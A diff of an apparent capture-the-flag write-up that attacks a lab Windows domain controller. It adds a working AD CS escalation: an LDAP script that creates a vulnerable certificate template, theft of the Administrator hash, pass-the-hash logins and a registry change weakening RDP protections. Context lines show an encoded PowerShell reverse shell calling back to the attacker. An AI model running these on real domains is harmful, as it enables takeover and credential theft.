@@ -48,7 +48,7 @@ DanglingTree is a medium-difficulty Windows machine that demonstrates how multip
 ### Full Port Scan
 
 ```shell
-nmap -sS -T4 -p- -Pn --min-rate 5000 -oA full_tcp 10.129.27.105
+nmap -sS -T4 -p- -Pn --min-rate 5000 -oA full_tcp 10.129.27.211
 ```
 
 ```text
@@ -95,7 +95,7 @@ The port profile immediately identifies a **Domain Controller** — DNS (53), Ke
 ### Targeted Service Scan
 
 ```shell
-nmap -sV -sC -A -p 80,443,6600 -Pn -oA detailed 10.129.27.105
+nmap -sV -sC -A -p 80,443,6600 -Pn -oA detailed 10.129.27.211
 ```
 
 ```text
@@ -121,7 +121,7 @@ PORT     STATE SERVICE     VERSION
 
 Browsing to port 6600 reveals the WAC login:
 
-![Sign in - Windows Admin Center](assets/danglingtree/wac_login.png "https://10.129.27.105:6600/")
+![Sign in - Windows Admin Center](assets/danglingtree/wac_login.png "https://10.129.27.211:6600/")
 
 No credentials yet. WAC becomes relevant once we find valid domain accounts.
 
@@ -131,14 +131,14 @@ No credentials yet. WAC becomes relevant once we find valid domain accounts.
 
 ```shell
 # DNS resolution
-echo '10.129.27.105    dc.danglingtree.htb danglingtree.htb danglingtree dc' | sudo tee -a /etc/hosts
+echo '10.129.27.211    dc.danglingtree.htb danglingtree.htb danglingtree dc' | sudo tee -a /etc/hosts
 
 # Kerberos configuration
-netexec smb 10.129.27.105 -u null -p '' --generate-krb5 krb5.conf
+netexec smb 10.129.27.211 -u null -p '' --generate-krb5 krb5.conf
 sudo mv krb5.conf /etc/krb5.conf
 
 # Time sync (Kerberos tolerates ±5 minutes)
-sudo ntpdate 10.129.27.105
+sudo ntpdate 10.129.27.211
 ```
 
 ---
@@ -148,17 +148,17 @@ sudo ntpdate 10.129.27.105
 ### Share Enumeration
 
 ```shell
-netexec smb 10.129.27.105 -u null -p '' --shares
+netexec smb 10.129.27.211 -u null -p '' --shares
 ```
 
 ```text
-SMB         10.129.27.105    445    DC               Share           Permissions     Remark
-SMB         10.129.27.105    445    DC               ADMIN$                          Remote Admin
-SMB         10.129.27.105    445    DC               C$                              Default share
-SMB         10.129.27.105    445    DC               IPC$            READ            Remote IPC
-SMB         10.129.27.105    445    DC               IT              READ            
-SMB         10.129.27.105    445    DC               NETLOGON                        Logon server share 
-SMB         10.129.27.105    445    DC               SYSVOL                          Logon server share 
+SMB         10.129.27.211    445    DC               Share           Permissions     Remark
+SMB         10.129.27.211    445    DC               ADMIN$                          Remote Admin
+SMB         10.129.27.211    445    DC               C$                              Default share
+SMB         10.129.27.211    445    DC               IPC$            READ            Remote IPC
+SMB         10.129.27.211    445    DC               IT              READ            
+SMB         10.129.27.211    445    DC               NETLOGON                        Logon server share 
+SMB         10.129.27.211    445    DC               SYSVOL                          Logon server share 
 ```
 
 The **IT** share allows unauthenticated read access — a common misconfiguration where shares are left with guest permissions after initial setup.
@@ -166,7 +166,7 @@ The **IT** share allows unauthenticated read access — a common misconfiguratio
 ### Data Exfiltration
 
 ```shell
-smbclient //10.129.27.105/IT -U null -N
+smbclient //10.129.27.211/IT -U null -N
 ```
 
 ```text
@@ -192,7 +192,7 @@ The PDF is a **Rules of Engagement** document from a prior grey-box assessment. 
 
 The recovered credentials grant access to WAC on port 6600:
 
-![Windows Admin Center](assets/danglingtree/wac_dashboard.png "https://10.129.27.105:6600/")
+![Windows Admin Center](assets/danglingtree/wac_dashboard.png "https://10.129.27.211:6600/")
 
 ### Weaponizing the WAC API
 
@@ -208,7 +208,7 @@ powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdA
 
 ```text
 listening on [any] 4444 ...
-connect to [10.10.15.203] from (UNKNOWN) [10.129.27.105] 52567
+connect to [10.10.15.203] from (UNKNOWN) [10.129.27.211] 52567
 
 PS C:\WINDOWS\system32>
 ```
@@ -391,7 +391,7 @@ curl -X POST 'http://127.0.0.1:17017/api/v1/settings/sysadmin/connect-to-hub' \
 
 ```text
 listening on [any] 4446 ...
-connect to [10.10.15.203] from (UNKNOWN) [10.129.27.105] 51534
+connect to [10.10.15.203] from (UNKNOWN) [10.129.27.211] 51534
 
 PS C:\Program Files (x86)\SmarterTools\SmarterMail\Service\Settings>
 ```
@@ -588,7 +588,7 @@ jake.h can **create objects** in both the Certificate Templates and OID containe
 ### Certipy Scan
 
 ```shell
-certipy-ad find -stdout -vulnerable -dc-ip 10.129.27.105 -u jake.h -p 'Welcome@1234'
+certipy-ad find -stdout -vulnerable -dc-ip 10.129.27.211 -u jake.h -p 'Welcome@1234'
 ```
 
 ```text
@@ -610,30 +610,176 @@ Certificate Templates                   : [!] Could not find any certificate tem
 
 ## Privilege Escalation — AD CS (Work in Progress)
 
-!!! warning "Work in Progress"
-    The root path via AD CS ESC7 exploitation is still being finalized. The remaining steps involve:
-    
-    1. Configuring the CA to require manager approval on a template
-    2. Requesting a certificate as Administrator (request goes pending)
-    3. Approving the pending request using jake.h's ManageCertificates right
-    4. Retrieving the issued certificate
-    5. PKINIT authentication → Administrator NT hash
-    6. Reading root.txt via SMB
 
-    This section will be completed once the exploitation is finalized.
+Create a vulnerable template
 
----
+```python
+python3 -c '
+import struct, ssl
+from ldap3 import Server, Connection, ALL, NTLM, Tls
 
-## Progress Summary
+tls = Tls(validate=ssl.CERT_NONE)
+server = Server("10.129.27.196", port=636, use_ssl=True, tls=tls, get_info=ALL)
+c = Connection(
+    server,
+    user=r"DANGLINGTREE\jake.h",
+    password="Welcome@1234",
+    authentication=NTLM,
+    auto_bind=True
+)
 
-| Step | User | Technique | Result |
-|------|------|-----------|--------|
-| 1 | — | SMB Guest Access | RoE document with `anderson.w` creds |
-| 2 | anderson.w | Windows Admin Center | Shell on DC |
-| 3 | anderson.w | Internal service discovery | SmarterMail on localhost:17017 |
-| 4 | — | CVE-2026-23760 | Sysadmin password reset |
-| 5 | svc_mail | CVE-2026-24423 | Shell as mail service account |
-| 6 | svc_mail | Impersonation API | `noah.b` plaintext password |
-| 7 | noah.b | DPAPI extraction | `alex.o` credentials |
-| 8 | alex.o | ForceChangePassword | `jake.h` password reset |
-| 9 | jake.h | AD CS ESC7 | **In Progress** |
+r = c.add(
+    "CN=VulnerableTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb",
+    attributes={
+        "objectClass": ["top", "pKICertificateTemplate"],
+        "cn": "VulnerableTemplate",
+        "displayName": "VulnerableTemplate",
+        "flags": "131680",
+        "revision": "100",
+        "pKIDefaultKeySpec": "1",
+        "pKIKeyUsage": b"\xa0\x00",
+        "pKIMaxIssuingDepth": "0",
+        "pKICriticalExtensions": ["2.5.29.15"],
+        "pKIExtendedKeyUsage": ["1.3.6.1.5.5.7.3.2"],
+        "pKIDefaultCSPs": ["1,Microsoft RSA SChannel Cryptographic Provider"],
+        "pKIExpirationPeriod": struct.pack("<q", -315360000000000),
+        "pKIOverlapPeriod": struct.pack("<q", -36288000000000),
+        "msPKI-Certificate-Name-Flag": "1",
+        "msPKI-Enrollment-Flag": "0",
+        "msPKI-Minimal-Key-Size": "2048",
+        "msPKI-Private-Key-Flag": "16842752",
+        "msPKI-RA-Signature": "0",
+        "msPKI-Template-Minor-Revision": "1",
+        "msPKI-Template-Schema-Version": "2",
+        "msPKI-Certificate-Application-Policy": ["1.3.6.1.5.5.7.3.2"],
+        "msPKI-Cert-Template-OID": "1.3.6.1.4.1.311.21.8.9999999.8888888.7777777.6666666.5555555.1.33.1"
+    }
+)
+print("[+] Created" if r else "[-] " + str(c.result["description"]))
+'
+```
+
+
+```shell
+certipy-ad find -vulnerable -stdout -u 'jake.h@danglingtree.htb' -p 'Welcome@1234' \
+  -dc-ip 10.129.27.196
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 34 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 11 enabled certificate templates
+[*] Finding issuance policies
+[*] Found 16 issuance policies
+[*] Found 0 OIDs linked to templates
+[*] Retrieving CA configuration for 'danglingtree-DC-CA' via RRP
+[*] Successfully retrieved CA configuration for 'danglingtree-DC-CA'
+[*] Checking web enrollment for CA 'danglingtree-DC-CA' @ 'dc.danglingtree.htb'
+[*] Enumeration output:
+Certificate Authorities
+  0
+    CA Name                             : danglingtree-DC-CA
+    DNS Name                            : dc.danglingtree.htb
+    Certificate Subject                 : CN=danglingtree-DC-CA, DC=danglingtree, DC=htb
+    Certificate Serial Number           : 6E77D503246E55B34D28C464F186BD4B
+    Certificate Validity Start          : 2026-08-03 16:32:49+00:00
+    Certificate Validity End            : 2126-08-03 16:42:49+00:00
+    Web Enrollment
+      HTTP
+        Enabled                         : False
+      HTTPS
+        Enabled                         : False
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
+    Permissions
+      Owner                             : DANGLINGTREE.HTB\Administrators
+      Access Rights
+        Enroll                          : DANGLINGTREE.HTB\Authenticated Users
+        ManageCertificates              : DANGLINGTREE.HTB\Helpdesk_Cert_Support
+                                          DANGLINGTREE.HTB\Domain Admins
+                                          DANGLINGTREE.HTB\Enterprise Admins
+                                          DANGLINGTREE.HTB\Administrators
+        ManageCa                        : DANGLINGTREE.HTB\Domain Admins
+                                          DANGLINGTREE.HTB\Enterprise Admins
+                                          DANGLINGTREE.HTB\Administrators
+    [+] User Enrollable Principals      : DANGLINGTREE.HTB\Authenticated Users
+    [+] User ACL Principals             : DANGLINGTREE.HTB\Helpdesk_Cert_Support
+    [!] Vulnerabilities
+      ESC7                              : User has dangerous permissions.
+Certificate Templates
+  0
+    Template Name                       : VulnerableTemplate
+    Display Name                        : VulnerableTemplate
+    Enabled                             : False
+    Client Authentication               : True
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : True
+    Certificate Name Flag               : EnrolleeSuppliesSubject
+    Extended Key Usage                  : Client Authentication
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Schema Version                      : 2
+    Validity Period                     : 1 year
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Template Created                    : 2026-08-20T23:07:04+00:00
+    Template Last Modified              : 2026-08-20T23:07:04+00:00
+    Permissions
+      Object Control Permissions
+        Owner                           : DANGLINGTREE.HTB\jake.h
+        Full Control Principals         : DANGLINGTREE.HTB\Domain Admins
+                                          DANGLINGTREE.HTB\Local System
+                                          DANGLINGTREE.HTB\Enterprise Admins
+        Write Owner Principals          : DANGLINGTREE.HTB\Domain Admins
+                                          DANGLINGTREE.HTB\Local System
+                                          DANGLINGTREE.HTB\Enterprise Admins
+        Write Dacl Principals           : DANGLINGTREE.HTB\Domain Admins
+                                          DANGLINGTREE.HTB\Local System
+                                          DANGLINGTREE.HTB\Enterprise Admins
+    [+] User ACL Principals             : DANGLINGTREE.HTB\jake.h
+    [!] Vulnerabilities
+      ESC4                              : Template is owned by user.
+```
+
+
+
+```shell
+certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.27.196                            
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'Administrator@danglingtree.htb'
+[*]     SAN URL SID: 'S-1-5-21-4220238332-57023728-1129110646-500'
+[*]     Security Extension SID: 'S-1-5-21-4220238332-57023728-1129110646-500'
+[*] Using principal: 'administrator@danglingtree.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'administrator.ccache'
+File 'administrator.ccache' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
+[*] Wrote credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@danglingtree.htb': aad3b435b51404eeaad3b435b51404ee:8cacb3a97e460c65d105ca7cd9913925
+```
+
+
+```shell
+impacket-psexec danglingtree.htb/administrator@10.129.27.196 -hashes aad3b435b51404eeaad3b435b51404ee:8cacb3a97e460c65d105ca7cd9913925
+```
+
+```shell
+Add-ADGroupMember -Identity Helpdesk_Cert_Support -Members Administrator
+```
+
+```shell
+nxc smb 10.129.27.196 -u administrator -H 8cacb3a97e460c65d105ca7cd9913925 -x 'reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f'
+```
+
+```shell
+xfreerdp3 /v:10.129.27.196 /u:administrator /pth:8cacb3a97e460c65d105ca7cd9913925
+```
+
